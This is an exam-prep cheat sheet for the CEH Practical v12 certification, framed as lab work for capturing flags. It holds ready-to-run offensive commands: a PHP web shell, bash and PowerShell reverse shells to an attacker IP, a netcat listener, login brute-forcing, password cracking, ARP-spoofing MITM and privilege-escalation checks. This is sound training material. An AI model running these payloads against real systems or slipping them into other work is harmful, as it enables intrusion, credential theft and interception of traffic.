
### **CEH Practical v12: Ultimate Prep Guide & Cheat Sheet**

---

### **Pre-Exam Strategy & Mindset**

1.  **Time Management is KEY:** 6 hours sounds long, but it flies. You have ~18 minutes per question. If you're stuck on a task for 15+ minutes, **flag it for review and move on**. Come back to it later.
2.  **Read Questions Carefully:** Understand what is being asked. Are you to find a vulnerability, exploit it, or perform a post-exploitation task? What is the exact flag format?
3.  **Document Everything:** Use the built-in notepad. Write down:
    *   IP addresses of targets.
    *   Usernames & passwords you find.
    *   Potential paths (e.g., `/secret-door/`).
    *   Commands that worked.
4.  **The Answer is in the Room:** You don't need to brute force something that isn't there. If a standard attack isn't working, you might be missing a step or using the wrong tool.

---

### **Essential Tool Cheat Sheet (The "Swiss Army Knives")**

#### **1. Reconnaissance & Scanning**

| Task | Command | Purpose |
| :--- | :--- | :--- |
| **Host Discovery** | `nmap -sn 192.168.1.0/24` | Ping sweep to find live hosts |
| **Port Scanning** | `nmap -sS -A -T4 <target_ip>` | Stealth SYN scan + OS/version detection |
| | `nmap -sV -sC -p- <target_ip>` | Version detection, default scripts, all ports |
| **Web Dir Enum** | `gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt` | Find hidden directories |
| | `gobuster dir -u http://<ip> -w wordlist.txt -x php,txt,bak` | Find files with extensions |
| **Subdomain Enum** | `gobuster dns -d example.com -w /usr/share/wordlists/SecLists/subdomains.txt` | Find subdomains |

#### **2. Vulnerability Assessment & Exploitation**

| Task | Command / Tool | Purpose |
| :--- | :--- | :--- |
| **Nikto Scan** | `nikto -h http://<ip>` | Quick web server vuln scan |
| **SQL Injection** | `sqlmap -u "http://<ip>/page?id=1" --dbs` | Automate SQLi discovery & exploitation |
| **Basic Login Brute-Force** | `hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"` | Brute-force web forms |
| **WordPress Scan** | `wpscan --url http://<ip> --enumerate u,p,t` | Enumerate users, plugins, themes |
| **Metasploit** | `msfconsole` | The exploitation framework |
| | `search <exploit_name>` | |
| | `use <exploit_path>` | |
| | `set RHOSTS <target_ip>` | |
| | `set LHOST <your_ip>` | |
| | `exploit` or `run` | |
| **File Upload Vuln** | Upload a `.php` web shell: `<?php system($_GET['cmd']); ?>` | Get command execution |
| **Reverse Shell (Linux)** | `bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'` | Spawn a reverse shell |
| **Reverse Shell (Windows)** | `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<YOUR_IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | Spawn a PowerShell reverse shell |
| **Listener** | `nc -nvlp 4444` | Listen for incoming reverse shells |

#### **3. Password Attacks**

| Task | Command | Purpose |
| :--- | :--- | :--- |
| **Hash Identification** | `hash-identifier` | Identify hash types (e.g., MD5, SHA1, NTLM) |
| **Crack MD5** | `hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt` | Crack hashes with wordlist |
| **Crack /etc/shadow** | `unshadow passwd.txt shadow.txt > hashes.txt` `john hashes.txt` | Crack Linux password hashes |
| **Crack Zip/RAR** | `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip` | Crack archived files |

#### **4. Post-Exploitation**

| Task | Command | Purpose |
| :--- | :--- | :--- |
| **Upgrade Shell** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Stabilize a shell |
| **Find SUID files** | `find / -perm -u=s -type f 2>/dev/null` | Find files with SUID bit set (privesc) |
| **Find files with CAP** | `getcap -r / 2>/dev/null` | Find files with capabilities (privesc) |
| **Check crontab** | `cat /etc/crontab` | Look for scheduled jobs (privesc) |
| **LinPEAS** | Often pre-downloaded. Run it: `./linpeas.sh` | Automatic Linux Privilege Escalation scanner |

---

### **Common Exam Scenarios & How to Approach Them**

1.  **"Find the flag on the server / website":**
    *   **Step 1:** `nmap` to find open ports (80, 443, 8080?).
    *   **Step 2:** Browse to the website. `View Source`. Check for comments.
    *   **Step 3:** Run `gobuster`/`dirb` to find hidden directories (`/admin`, `/backup`, `/secret`).
    *   **Step 4:** Check for common files (`robots.txt`, `sitemap.xml`, `index.php.bak`).

2.  **"Gain access to the system / Find a user flag":**
    *   **Step 1:** Comprehensive `nmap -A` scan.
    *   **Step 2:** Check web apps for SQLi, File Upload, Command Injection.
    *   **Step 3:** Check for vulnerable services (e.g., FTP anonymous login, SMB shares with `smbclient`).
    *   **Step 4:** If you get a low-privilege shell, **immediately try to escalate privileges** using the commands above or `linpeas`. The user flag is often in `/home/<user>/user.txt`.

3.  **"Escalate your privileges / Find the root flag":**
    *   This *will* be on the exam.
    *   **Run LinPEAS.** It's the fastest way.
    *   Manually check: `sudo -l`, SUID files, crontab, kernel version (for known exploits), writable system files.
    *   The root flag is almost always in `/root/root.txt`.

4.  **"Crack the password for user X":**
    *   You might find a password hash in a database dump, a config file, or a memory dump.
    *   Use `hash-identifier`, then `john` or `hashcat`.
    *   The wordlist `rockyou.txt` is your best friend. It's located at `/usr/share/wordlists/rockyou.txt` (you may need to `gunzip` it first).

5.  **"Perform a sniffing attack / MITM":**
    *   Be comfortable with Wireshark. You might need to capture traffic and analyze packets (e.g., find a password in a plaintext protocol like FTP or HTTP).
    *   Know how to use `arpspoof` for a basic MITM:
        ```bash
        echo 1 > /proc/sys/net/ipv4/ip_forward # Enable IP forwarding
        arpspoof -i eth0 -t <target_ip> <router_ip>
        arpspoof -i eth0 -t <router_ip> <target_ip>
        ```
        Then use Wireshark to sniff on `eth0`.

### **Final Tips for Exam Day**

1.  **Get Comfortable with the iLabs UI:** The exam environment can be laggy. Know how to use the built-in terminal, web browser, and notepad.
2.  **Know Your IP Address:** Your attack machine's IP is usually something like `192.168.1.10` or `10.10.10.10`. The target network will be provided. **`ifconfig` / `ip a` is your first command.**
3.  **Flags are Exact:** The flag must be submitted exactly as found, e.g., `FLAG:1234-5678-90ab-cdef`.
4.  **Process of Elimination:** If a tool isn't working (e.g., `sqlmap` is erroring), try another approach or tool. Don't fixate.
5.  **You Are an Ethical Hacker:** The goal is to find the vulnerability, exploit it, and find the flag. You are not meant to DoS or destroy the lab.

You've got this! The exam is designed to be passed by someone who has practiced the tools and methodologies. Stay calm, manage your time, and methodically work through each challenge.

**Good luck on the 27th!**